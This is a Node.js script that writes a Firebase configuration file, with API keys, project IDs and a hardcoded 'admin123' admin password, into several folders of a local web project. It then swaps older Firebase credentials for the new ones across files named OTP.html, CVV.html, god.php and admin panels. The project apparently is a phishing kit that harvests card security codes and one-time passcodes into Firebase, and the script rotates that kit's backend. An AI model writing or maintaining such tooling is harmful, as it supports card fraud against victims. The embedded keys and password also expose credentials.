const fs = require('fs');

const tridfdfConfigJS = `/**
 * ⚙️ CONFIGURACIÓN CENTRALIZADA DEL PROYECTO
 * Vinculado a tu cuenta privada de Firebase: tridfdf
 */
window.APP_CONFIG = {
    // 🗄️ Credenciales Privadas de tu proyecto tridfdf en Firebase
    firebaseConfig: {
        apiKey: "AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA",
        authDomain: "tridfdf.firebaseapp.com",
        databaseURL: "https://tridfdf-default-rtdb.firebaseio.com",
        projectId: "tridfdf",
        storageBucket: "tridfdf.firebasestorage.app",
        messagingSenderId: "1013947777606",
        appId: "1:1013947777606:web:f5fc9ed9568b2e53730047",
        measurementId: "G-X46JWX8YLG"
    },

    // 👤 Nodo raíz de administración
    adminUserId: "admin",

    // 🔑 Clave de Acceso para el Panel Admin
    adminAccessPass: "admin123",

    // 📡 Token de Sesión por Defecto
    defaultSessionToken: "main_session"
};
`;

const configFiles = [
    'c:/xampp/htdocs/Pruebas/jj/assets/js/config.js',
    'c:/xampp/htdocs/Pruebas/jj/admin/assets/js/config.js',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/assets/js/config.js',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/public/assets/js/config.js'
];

configFiles.forEach(f => {
    if (fs.existsSync(f)) {
        fs.writeFileSync(f, tridfdfConfigJS);
        console.log('✅ UPDATED CONFIG.JS TO TRIDFDF IN ' + f);
    }
});

// SEARCH & REPLACE OLD CREDS WITH TRIDFDF CREDS IN ALL FILES
const allFilesToUpdate = [
    'c:/xampp/htdocs/Pruebas/jj/assets/js/app.js',
    'c:/xampp/htdocs/Pruebas/jj/admin.html',
    'c:/xampp/htdocs/Pruebas/jj/admin.php',
    'c:/xampp/htdocs/Pruebas/jj/god.php',
    'c:/xampp/htdocs/Pruebas/jj/OTP.html',
    'c:/xampp/htdocs/Pruebas/jj/CVV.html',
    'c:/xampp/htdocs/Pruebas/jj/index.html',
    'c:/xampp/htdocs/Pruebas/jj/admin/admin.html',
    'c:/xampp/htdocs/Pruebas/jj/admin/admin.php',
    'c:/xampp/htdocs/Pruebas/jj/admin/index.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/assets/js/app.js',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/admin.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/OTP.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/CVV.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/public/assets/js/app.js',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/public/admin.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/public/OTP.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/public/CVV.html',
    'c:/xampp/htdocs/Pruebas/jj/vercel_admin/public/index.html'
];

allFilesToUpdate.forEach(f => {
    if (!fs.existsSync(f)) return;
    let content = fs.readFileSync(f, 'utf8');
    let updated = false;

    if (content.includes('tigg-51f26-default-rtdb.firebaseio.com') || content.includes('gol404-default-rtdb.firebaseio.com')) {
        content = content.replaceAll('https://tigg-51f26-default-rtdb.firebaseio.com', 'https://tridfdf-default-rtdb.firebaseio.com');
        content = content.replaceAll('https://gol404-default-rtdb.firebaseio.com', 'https://tridfdf-default-rtdb.firebaseio.com');
        updated = true;
    }
    if (content.includes('tigg-51f26.firebaseapp.com') || content.includes('gol404.firebaseapp.com')) {
        content = content.replaceAll('tigg-51f26.firebaseapp.com', 'tridfdf.firebaseapp.com');
        content = content.replaceAll('gol404.firebaseapp.com', 'tridfdf.firebaseapp.com');
        updated = true;
    }
    if (content.includes('tigg-51f26.firebasestorage.app') || content.includes('gol404.firebasestorage.app')) {
        content = content.replaceAll('tigg-51f26.firebasestorage.app', 'tridfdf.firebasestorage.app');
        content = content.replaceAll('gol404.firebasestorage.app', 'tridfdf.firebasestorage.app');
        updated = true;
    }
    if (content.includes('AIzaSyDbVS504vtsOWkgnBMzoViRBpgqHkfc3A4') || content.includes('AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8') || content.includes('AIzaSyBNrXOQTETlHVcy5G9VV9U4B9q3OL2TylU')) {
        content = content.replaceAll('AIzaSyDbVS504vtsOWkgnBMzoViRBpgqHkfc3A4', 'AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA');
        content = content.replaceAll('AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8', 'AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA');
        content = content.replaceAll('AIzaSyBNrXOQTETlHVcy5G9VV9U4B9q3OL2TylU', 'AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA');
        updated = true;
    }
    if (content.includes('502610353442') || content.includes('268392083471')) {
        content = content.replaceAll('502610353442', '1013947777606');
        content = content.replaceAll('268392083471', '1013947777606');
        updated = true;
    }
    if (content.includes('1:502610353442:web:daac1413b1623777b9597b') || content.includes('1:502610353442:web:29e2c7bd9459277db9597b') || content.includes('1:268392083471:web:d4e829e13f06f88594337a')) {
        content = content.replaceAll('1:502610353442:web:daac1413b1623777b9597b', '1:1013947777606:web:f5fc9ed9568b2e53730047');
        content = content.replaceAll('1:502610353442:web:29e2c7bd9459277db9597b', '1:1013947777606:web:f5fc9ed9568b2e53730047');
        content = content.replaceAll('1:268392083471:web:d4e829e13f06f88594337a', '1:1013947777606:web:f5fc9ed9568b2e53730047');
        updated = true;
    }
    if (content.includes('"tigg-51f26"') || content.includes('"gol404"')) {
        content = content.replaceAll('"tigg-51f26"', '"tridfdf"');
        content = content.replaceAll('"gol404"', '"tridfdf"');
        updated = true;
    }

    if (updated) {
        fs.writeFileSync(f, content);
        console.log('✅ REPLACED CREDENTIALS WITH TRIDFDF IN ' + f);
    }
});
